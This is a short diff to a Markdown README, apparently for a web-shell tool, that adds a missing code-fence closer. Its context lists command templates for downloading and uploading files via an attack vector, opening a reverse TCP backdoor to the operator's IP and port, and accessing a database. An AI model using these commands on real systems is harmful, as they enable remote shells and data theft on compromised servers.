@@ -21,7 +21,7 @@
 - Download
   - ```file_download -vector [VECTOR] [FileName] -host [HOST] [location to store file]```
 - Upload
-  - ```file_upload -vector [VECTOR] [location on local machine] [location to store file]
+  - ```file_upload -vector [VECTOR] [location on local machine] [location to store file]```
 - Reverse shell
   - ```backdoor_reversetcp -vector [VECTOR] [Your IP] [PORT]```
 - Access database
